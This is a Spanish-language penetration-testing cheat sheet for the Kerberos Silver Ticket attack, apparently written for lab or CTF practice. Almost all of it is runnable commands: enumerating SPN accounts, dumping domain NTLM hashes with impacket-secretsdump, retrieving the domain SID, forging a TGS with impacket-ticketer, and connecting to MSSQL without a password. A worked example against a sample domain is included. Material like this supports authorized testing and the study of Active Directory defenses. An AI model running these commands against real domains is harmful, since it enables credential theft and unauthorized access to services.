Silver Ticket (TGS)

Silver Ticket permite crear TGS para un servicio concreto si se conoce el hash de la cuenta de servicio o del equipo correspondiente.

Aviso: Kerberos Silver Ticket permite crear tickets TGS para un servicio específico del dominio

- Requisitos: hash NTLM del SPN (Cuenta de servicio) y SID del dominio

Enumerar Usuarios SPN

PowerShell: Enumerar Usuarios SPN

Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
# Ejemplo: (MSSQLSvc/dc.custom.local) (CIFS/server.custom.local) (HTTP/web.custom.local)

hash del SPN

Kali: Dumpear hashes del dominio para extrear hash del SPN

impacket-secretsdump <user>:<pass>@<ip_dc> -just-dc-ntlm
# hash NTLM SPN: hash NT -> MSSQLSvc/dc.custom.local = 58A478135A93AC3BF058A5EA0E8FDB71

Enumerar SID del dominio

Windows: Enumerar SID del dominio

. .\PowerView.ps1
Get-DomainSID
# SID: S-1-5-21-877193438-1177953900-3661342299

Kali: Enumerar SID del dominio

# Impacket
impacket-lookupsid <user>:<pass>@<ip_dc> | grep "Domain SID"
# Netexec
nxc ldap <ip_dc> -u <user> -p <pass> --get-sid
# SID: S-1-5-21-877193438-1177953900-3661342299

Crear Ticket

Kali: Crear ticket TGS

# Poner user_random un usuario que no exista o Administrator
impacket-ticketer -nthash <hash_spn> -domain-sid <SID> -domain <dominio> -spn <user_spn><user_random>
# Se genera el ticket <user_random>.ccache y exportamos el ticket a la variable de entorno
export KRB5CCNAME=/home/path_to/<user_random>.ccache
# Conexión al servicio MSSQL sin contraseña con los parámetros -k -no-pass
impacket-mssqlclient <dominio>/<user_random>@<ip_dc> -k -no-pass

Ejemplo

Kali: Silver Ticket para MSSQL

impacket-ticketer \
  -nthash 58A478135A93AC3BF058A5EA0E8FDB71 \
  -domain-sid S-1-5-21-877193438-1177953900-3661342299 \
  -domain custom.local \
  -spn MSSQLSvc/dc.custom.local \
  bob

# Se genera bob.ccache
export KRB5CCNAME=./bob.ccache

# Conexión al servicio MSSQL sin contraseña con los parámetros -k -no-pass
impacket-mssqlclient custom.local/bob@10.10.10.10 -no-pass -k
